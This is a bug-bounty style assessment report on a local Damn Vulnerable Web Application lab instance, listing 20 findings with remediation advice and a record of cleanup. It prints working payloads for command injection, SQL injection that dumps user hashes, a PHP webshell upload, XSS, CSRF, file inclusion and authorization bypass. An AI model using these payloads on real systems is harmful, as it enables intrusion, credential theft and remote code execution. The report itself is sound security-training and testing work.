# Bug Bounty Report — Damn Vulnerable Web Application (DVWA)

| Field | Value |
|---|---|
| **Target** | `http://localhost/DVWA/` |
| **Application** | Damn Vulnerable Web Application (DVWA) |
| **Environment** | Apache/2.4.68 (Debian), PHP, MariaDB 11.8.8 (Debian), Kali Linux host (`blackranger`) |
| **Security level tested** | `low` (set via authenticated `/DVWA/security.php`) |
| **Credentials used** | `admin:password` (and `gordonb:abc123` for the authz test) |
| **Tools** | Burp Suite (Burp MCP: `send_http1_request`, proxy/tools integration) |
| **Tester** | Security assessment (authorized lab testing) |
| **Date** | 2026-08-31 |

---

## 1. Executive Summary

A full authenticated assessment of the DVWA instance (security level `low`) was performed entirely through the Burp Suite MCP interface. **20 vulnerabilities were confirmed**, including **3 Critical** findings that lead to full remote code execution as `www-data` (OS command injection, SQL injection, unrestricted file upload), an authorization bypass allowing a low-privilege user to modify the admin account, and a wide range of web application flaws (blind SQLi, LFI, stored/reflected/DOM XSS, CSRF, weak session IDs, open redirect, weak cryptography, brute-forceable login, CSP bypass).

### Summary of findings

| # | Finding | Severity | CVSS 3.1 |
|---|---|---|---|
| 1 | OS Command Injection (RCE) | **Critical** | 9.8 |
| 2 | SQL Injection (UNION-based, full DB dump) | **Critical** | 8.8 |
| 3 | Unrestricted File Upload → RCE (PHP webshell) | **Critical** | 9.8 |
| 4 | Blind SQL Injection (boolean-based) | High | 8.5 |
| 5 | Local File Inclusion (`/etc/passwd` disclosure) | High | 7.5 |
| 6 | Authorisation Bypass / IDOR (profile update) | High | 8.1 |
| 7 | Stored XSS (guestbook) | High | 7.4 |
| 8 | CSRF — password change without token | High | 8.8 |
| 9 | Reflected XSS | Medium | 6.1 |
| 10 | DOM-based XSS | Medium | 6.1 |
| 11 | Open HTTP Redirect | Medium | 5.4 |
| 12 | Weak session identifiers (sequential) | Medium | 5.3 |
| 13 | Insecure CAPTCHA (step-parameter bypass) | Medium | 5.3 |
| 14 | Weak cryptography (XOR cipher, hardcoded secret) | Medium | 5.3 |
| 15 | Brute force (no rate limiting / lockout) | Medium | 5.3 |
| 16 | Session fixation + loss of HttpOnly at `low` | Low | 4.2 |
| 17 | CSP bypass (arbitrary script include) | Low | 4.3 |
| 18 | Client-side-only anti-bot token (JavaScript) | Low | 4.2 |
| 19 | Full path disclosure (verbose errors) | Low | 3.7 |
| 20 | Verbose DB errors (schema/version leakage) | Info | — |

**Not exploitable in this deployment (documented):** the API module (`/vulnerabilities/api/`) — vulnerable by design (versioned endpoints, older API returns password hashes) but all endpoints returned 404 because `mod_rewrite` is disabled and composer vendor files were never installed. The time-based variant of blind SQLi was attempted; `SLEEP()` produced no measurable delay on this MariaDB build, so only the boolean variant is reported as confirmed.

---

## 2. Findings

### Finding 1 — OS Command Injection → Remote Code Execution (Critical, CVSS 9.8)

- **Endpoint:** `POST /DVWA/vulnerabilities/exec/`
- **Parameter:** `ip`
- **CWE:** CWE-78 (OS Command Injection)

**Description:** User input is passed directly to `shell_exec()` without sanitization. Command chaining operators (`&&`, `;`) execute arbitrary OS commands as the web server user (`www-data`).

**Steps to reproduce:**
1. `POST /DVWA/vulnerabilities/exec/` with body `ip=127.0.0.1+%26%26+whoami&Submit=Submit`
2. Observe command output in the response.

**PoC requests / evidence:**
```http
POST /DVWA/vulnerabilities/exec/ HTTP/1.1
Cookie: PHPSESSID=0e7442eb2ca016c16ca0c2bd6440feec; security=low
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1+%26%26+whoami&Submit=Submit
```
Response contained: `www-data`

```http
ip=127.0.0.1%3Bcat+%2Fetc%2Fpasswd&Submit=Submit
```
Response contained the full `/etc/passwd` (root, zane001, mysql, … accounts exposed).

```http
ip=127.0.0.1+%26%26+uname+-a&Submit=Submit
```
→ `Linux blackranger 7.0.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 7.0.12-2kali1 (2026-06-18) x86_64 GNU/Linux`

**Impact:** Complete server compromise — arbitrary command execution, file disclosure, pivot point for internal network attacks.

**Remediation:** Use `escapeshellarg()`/`escapeshellcmd()` with an allowlist of safe inputs; avoid `shell_exec` entirely; run the web server with least privilege.

---

### Finding 2 — SQL Injection (UNION-based) (Critical, CVSS 8.8)

- **Endpoint:** `GET /DVWA/vulnerabilities/sqli/?id=…`
- **Parameter:** `id`
- **CWE:** CWE-89

**Description:** The `id` parameter is concatenated into a SQL query without escaping. Error-based and UNION-based injection is possible; the entire database can be dumped.

**Evidence:**
```http
GET /DVWA/vulnerabilities/sqli/?id=1%27&Submit=Submit HTTP/1.1
```
→ `Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; … in /var/www/html/DVWA/vulnerabilities/sqli/source/low.php:12` (also leaks the absolute server path).

```http
GET /DVWA/vulnerabilities/sqli/?id=999%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit
```
Returned all credentials:
```
admin   5f4dcc3b5aa765d61d8327deb882cf99   (MD5 → "password")
gordonb e99a18c428cb38d5f260853678922e03   (MD5 → "abc123")
1337    8d3533d75ae2c3966d7e0d4fcc69216b
pablo   0d107d09f5bbe40cade3de5c71e9e9b7
smithy  5f4dcc3b5aa765d61d8327deb882cf99
```
Also extracted: `database() = dvwa`, `@@version = 11.8.8-MariaDB-1 from Debian`.

**Impact:** Full database compromise (user credentials — unsalted MD5 — and any table readable), credential reuse, complete application takeover.

**Remediation:** Parameterized queries / prepared statements for every query; validate input types.

---

### Finding 3 — Unrestricted File Upload → RCE via PHP Webshell (Critical, CVSS 9.8)

- **Endpoint:** `POST /DVWA/vulnerabilities/upload/`
- **CWE:** CWE-434

**Description:** The upload endpoint accepts any file type with no validation. An uploaded PHP file in `hackable/uploads/` is directly executable by the web server.

**Evidence:**
```http
POST /DVWA/vulnerabilities/upload/ HTTP/1.1
Content-Type: multipart/form-data; boundary=----XBoundary123

------XBoundary123
Content-Disposition: form-data; name="uploaded"; filename="s.php"
Content-Type: application/x-php

<?php echo shell_exec($_GET['cmd']); ?>
------XBoundary123
Content-Disposition: form-data; name="Upload"

Upload
------XBoundary123--
```
Response: `../../hackable/uploads/s.php succesfully uploaded!`

Verification:
```http
GET /DVWA/hackable/uploads/s.php?cmd=id
```
→ `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

**Impact:** Remote code execution as `www-data` without authentication (the uploaded file was accessible unauthenticated).

**Remediation:** Validate file extensions and MIME types server-side, store uploads outside the web root, serve uploads with a `Content-Disposition: attachment` header / non-executable handler, randomize filenames. *(Test file was removed after verification.)*

---

### Finding 4 — Blind SQL Injection (boolean-based) (High, CVSS 8.5)

- **Endpoint:** `GET /DVWA/vulnerabilities/sqli_blind/?id=…`
- **CWE:** CWE-89

**Description:** The same unescaped concatenation exists, but results are not displayed. The difference between "exists" (HTTP 200) and "missing" (HTTP 404) responses forms a boolean oracle enabling byte-by-byte data extraction.

**Evidence:**
| Payload | Response |
|---|---|
| `id=1` | 200 `User ID exists in the database.` |
| `id=1' AND '1'='1'#` | 200 (TRUE) |
| `id=1' AND '1'='2'#` | 404 `User ID is MISSING from the database.` (FALSE) |
| `id=1' AND SUBSTRING(user(),1,1)='d'#` | 200 — proved extraction of the DB user's first character |

Time-based payload `id=1' AND IF(1=1,SLEEP(5),0)=0#` executed without measurable delay on this MariaDB build (noted; boolean variant fully confirmed).

**Impact:** Full database extraction despite non-verbose errors.

**Remediation:** Prepared statements (same as Finding 2).

---

### Finding 5 — Local File Inclusion (High, CVSS 7.5)

- **Endpoint:** `GET /DVWA/vulnerabilities/fi/?page=…`
- **CWE:** CWE-22 / CWE-98

**Description:** The `page` parameter is passed directly to PHP `include()` with no validation. Path traversal reads arbitrary files readable by `www-data`.

**Evidence:**
```http
GET /DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd
```
→ full `/etc/passwd` returned in the response body.

```http
GET /DVWA/vulnerabilities/fi/?page=../../../../../../etc/hostname
```
→ `blackranger`

Warnings also leaked the absolute document root: `/var/www/html/DVWA/vulnerabilities/fi/index.php` on line 36. `php://filter` chains for reading PHP source (e.g., DB config) were blocked by `allow_url_include=Off`.

**Impact:** Arbitrary local file disclosure (config files, logs, backups) and a stepping stone toward LFI→RCE via log poisoning or file-upload chaining.

**Remediation:** Whitelist included files; never pass user input to `include()`.

---

### Finding 6 — Authorisation Bypass / IDOR (High, CVSS 8.1)

- **Endpoint:** `POST /DVWA/vulnerabilities/authbypass/change_user_details.php`
- **CWE:** CWE-639 (IDOR) / CWE-862 (Missing Authorization)

**Description:** The profile-update API trusts the client-supplied `id` in the JSON body and performs no server-side ownership/role check. A low-privilege user can modify any account, including `admin`.

**Evidence (as user `gordonb`):**
```http
POST /DVWA/vulnerabilities/authbypass/change_user_details.php HTTP/1.1
Cookie: PHPSESSID=c7559d62ae894a88961cc68f010da215; security=low
Content-Type: application/json

{"id":"1","first_name":"pwned","surname":"admin"}
```
→ `{"result":"ok"}`

Verification via `GET /DVWA/vulnerabilities/authbypass/get_user_data.php`:
```json
[{"user_id":"1","first_name":"pwned","surname":"admin"}, …]
```
Admin's record was modified by `gordonb`. (Change was reverted after verification.)

**Impact:** Horizontal privilege escalation — any user can modify (or tamper with) any other user's account data; depending on fields exposed, full account takeover.

**Remediation:** Derive the user ID from the server-side session; enforce ownership and role checks server-side for every API call.

---

### Finding 7 — Stored XSS (High, CVSS 7.4)

- **Endpoint:** `POST /DVWA/vulnerabilities/xss_s/` (guestbook)
- **CWE:** CWE-79

**Description:** Guestbook messages are stored and rendered without HTML encoding. Scripts execute for every visitor of the page (persistent, unauthenticated victims if the page is public).

**Evidence:**
```http
POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

mtxMessage=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&txtName=test&btnSign=Sign+Guestbook
```
Response renders:
```html
<div id="guestbook_comments">Name: test<br />Message: <script>alert(document.cookie)</script><br /></div>
```
The payload persists in the database and executes on every subsequent page view.

**Impact:** Session hijacking, credential phishing, defacement, drive-by malware for every visitor.

**Remediation:** HTML-encode on output (`htmlspecialchars()`), CSP, sanitize on input where rich text is required. *(Test entry cleared after verification.)*

---

### Finding 8 — CSRF: Password Change Without Token (High, CVSS 8.8)

- **Endpoint:** `GET /DVWA/vulnerabilities/csrf/?password_new=…&password_conf=…&Change=Change`
- **CWE:** CWE-352

**Description:** The password-change function accepts a plain GET request with no anti-CSRF token. A malicious page can force an authenticated admin's browser to change their password.

**Evidence:**
```http
GET /DVWA/vulnerabilities/csrf/?password_new=csrf1234&password_conf=csrf1234&Change=Change
Cookie: PHPSESSID=0e7442eb2ca016c16ca0c2bd6440feec; security=low
```
→ `<pre>Password Changed.</pre>` (no token present in the request)

The password was successfully reverted to the original value afterwards using the same endpoint.

**Impact:** Account takeover — an attacker silently resets the victim's password.

**Remediation:** Anti-CSRF tokens on all state-changing operations, use POST, `SameSite=Lax/Strict` cookies, verify `Origin`/`Referer`.

---

### Finding 9 — Reflected XSS (Medium, CVSS 6.1)

- **Endpoint:** `GET /DVWA/vulnerabilities/xss_r/?name=…`

```http
GET /DVWA/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E
```
→ `<pre>Hello <script>alert(document.cookie)</script></pre>`
The app additionally sends `X-XSS-Protection: 0`, disabling browser anti-XSS filters.

---

### Finding 10 — DOM-based XSS (Medium, CVSS 6.1)

- **Endpoint:** `GET /DVWA/vulnerabilities/xss_d/?default=…`

The `default` parameter is taken from `document.location.href` and written into the DOM with `document.write()` without encoding:
```js
document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
```
Payload `default=</option><script>alert(1)</script>` breaks out of the `<option>` attribute and executes.

---

### Finding 11 — Open HTTP Redirect (Medium, CVSS 5.4)

- **Endpoint:** `GET /DVWA/vulnerabilities/open_redirect/source/low.php?redirect=…`

```http
GET /DVWA/vulnerabilities/open_redirect/source/low.php?redirect=https%3A%2F%2Fevil.example.com%2Fphish
```
→ `HTTP/1.1 302 Found` with `location: https://evil.example.com/phish`

**Impact:** Credential phishing, token leakage, malware distribution via trusted-domain links.

---

### Finding 12 — Weak Session Identifiers (Medium, CVSS 5.3)

- **Endpoint:** `POST /DVWA/vulnerabilities/weak_id/`

Session IDs are sequential integers:
- First POST → `Set-Cookie: dvwaSession=1`
- Second POST → `Set-Cookie: dvwaSession=2`

Predictable session IDs allow session hijacking by simply iterating values.

---

### Finding 13 — Insecure CAPTCHA: step-parameter bypass (Medium, CVSS 5.3)

- **Endpoint:** `POST /DVWA/vulnerabilities/captcha/`

The vulnerable flow (confirmed via the application's own source viewer — `view_source.php?id=captcha&security=low`): the password-change logic is reached with `step=2`, which performs the update with **no CAPTCHA validation at all** (`step=1` performs the reCAPTCHA check; `step=2` skips it). An attacker who directly submits `step=2` with `password_new`/`password_conf` bypasses the CAPTCHA entirely.

*Note:* in this deployment the module's POST handling appeared non-functional at runtime (identical page returned for all POST variations, reCAPTCHA key missing) — the flaw is confirmed at the source level.

---

### Finding 14 — Weak Cryptography: XOR cipher + hardcoded credential comparison (Medium, CVSS 5.3)

- **Endpoint:** `POST /DVWA/vulnerabilities/cryptography/index.php`

- Messages are "encrypted" with a repeating-key XOR using the hardcoded key `wachtwoord` (visible via the app's source viewer).
- The intercepted message `Lg4WGlQZChhSFBYSEB8bBQtPGxdNQSwEHREOAQY=` (base64) XOR-decrypts byte-by-byte with that key to:
  `Your new password is: Olifant`
- The login form compares the submitted password against the **hardcoded** value `Olifant`:

```http
POST /DVWA/vulnerabilities/cryptography/index.php
Content-Length: 16

password=Olifant
```
→ `<div class="success">Welcome back user</div>` (login success without knowing the cipher at all)

**Impact:** Repeating-key XOR is trivially breakable (known-plaintext/frequency analysis), and the hardcoded comparison defeats the cipher entirely.

---

### Finding 15 — Brute Force: No Rate Limiting / Account Lockout (Medium, CVSS 5.3)

- **Endpoint:** `GET /DVWA/vulnerabilities/brute/?username=…&password=…&Login=Login`

Unlimited, rapid authentication attempts are permitted with no lockout, CAPTCHA, or rate limiting. The response also differentiates users: correct credentials return `Welcome to the password protected area admin` plus the user's avatar image (`/DVWA/hackable/users/admin.jpg`), enabling both credential guessing and username enumeration.

---

### Finding 16 — Session Fixation + Loss of HttpOnly at `low` (Low, CVSS 4.2)

At security level `low`, DVWA intentionally **keeps the pre-authentication session ID after login** (the app's own `dvwaPage.inc.php` documents: *"For lower levels, we want to allow session fixation attacks, so if an id already exists, we don't want it to change after authentication"*). An attacker who fixes a victim's `PHPSESSID` inherits the authenticated session. Additionally, at `low` the session cookie is set **without `HttpOnly`/`SameSite`** flags (`Set-Cookie: PHPSESSID=…; path=/`), making it readable by JavaScript (see Finding 7).

---

### Finding 17 — CSP Bypass: arbitrary script include (Low, CVSS 4.3)

- **Endpoint:** `POST /DVWA/vulnerabilities/csp/` — parameter `include`

The application echoes a user-controlled URL into a `<script src=…>` tag:
```http
POST /DVWA/vulnerabilities/csp/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded

include=https%3A%2F%2Fdigi.ninja%2Fdvwa%2Falert.js
```
→ `<script src='https://digi.ninja/dvwa/alert.js'></script>`

The page's CSP (`script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com https://digi.ninja`) is a static whitelist of third-party hosts — any script from those hosts (or content-sniffing bypasses on them) executes. User-controlled script inclusion defeats the CSP's purpose.

---

### Finding 18 — Client-side-only anti-bot token (Low, CVSS 4.2)

- **Endpoint:** `POST /DVWA/vulnerabilities/javascript/`

The "security" token is computed entirely in the browser: `token = md5(rot13(phrase))`. An attacker computes the expected value offline — e.g. `md5(rot13("success")) = md5("fhpprff") = 38581812b435834ebf84ebcc2c6424d6` (computed during testing via the SQLi endpoint's `MD5()` function — see Finding 2).

```http
POST /DVWA/vulnerabilities/javascript/ HTTP/1.1
Content-Length: 65

phrase=success&token=38581812b435834ebf84ebcc2c6424d6&send=Submit
```
→ `Well done!`

**Impact:** The client-side check provides zero protection for automated abuse.

---

### Finding 19 — Full Path Disclosure (Low, CVSS 3.7)

Verbose PHP warnings/errors across modules reveal absolute server paths:
- `/var/www/html/DVWA/vulnerabilities/sqli/source/low.php:12`
- `/var/www/html/DVWA/vulnerabilities/fi/index.php:36`
- `/var/www/html/DVWA/dvwa/includes/dvwaPage.inc.php:384`
- `reCAPTCHA API key missing from config file: /var/www/html/DVWA/config/config.inc.php`

---

### Finding 20 — Verbose Database Errors (Info)

The SQLi error message disclosed the database engine and version: `MariaDB server version … 11.8.8-MariaDB-1 from Debian`, plus the executed query string, which accelerates further attacks.

---

## 3. Notes / Non-exploitable items

- **API module** (`/vulnerabilities/api/`): designed to demonstrate unsafe API versioning (older API versions returning password hashes). In this deployment all API routes (`/vulnerabilities/api/v1/user/`, `/vulnerabilities/api/v2/user/`, `/DVWA/vulnerabilities/api/v2/user/index.php`) returned 404 because `mod_rewrite` is disabled and composer vendor dependencies were not installed. Reported as environmental, not exploitable.
- **Time-based blind SQLi:** `SLEEP()`-based payloads returned immediately on this MariaDB build; the boolean variant (Finding 4) remains fully confirmed.
- **`php://filter` LFI→source-read chain:** blocked by `allow_url_include=Off`.
- The `login.php` form itself is not SQL-injectable (prepared statements are used there) and the anti-CSRF token mechanism on the login page worked correctly.

## 4. Cleanup performed

- Uploaded webshell `hackable/uploads/s.php` was deleted (verified 404 afterwards).
- The stored-XSS guestbook entry was cleared via the application's own clear function.
- Admin password changes performed during CSRF testing were reverted to the original value (verified by successful re-login with `admin:password`).
- The profile modification made during the authorisation-bypass test was reverted (verified via `get_user_data.php`).
- Security level was left at `low` for the admin session that was active during testing; newly created sessions default to `impossible`.

## 5. Recommendation summary

1. Apply prepared statements everywhere; remove string-built queries.
2. Replace `shell_exec()` usage with safe APIs; apply allowlists.
3. Enforce server-side file-type validation and store uploads outside the web root.
4. Whitelist included files; enable `allow_url_include=Off` (already off — keep).
5. Enforce server-side authorization on every API call (session-derived identity).
6. Output-encode all user data; add a strict CSP without user-controllable sinks.
7. Add anti-CSRF tokens, rate limiting, lockout, and CAPTCHAs where appropriate.
8. Regenerate session IDs on login at every security level; always set `HttpOnly`, `SameSite`, and `Secure` flags.
9. Replace the XOR "encryption" and hardcoded credential comparison with real authentication.
10. Disable `display_errors` in production.
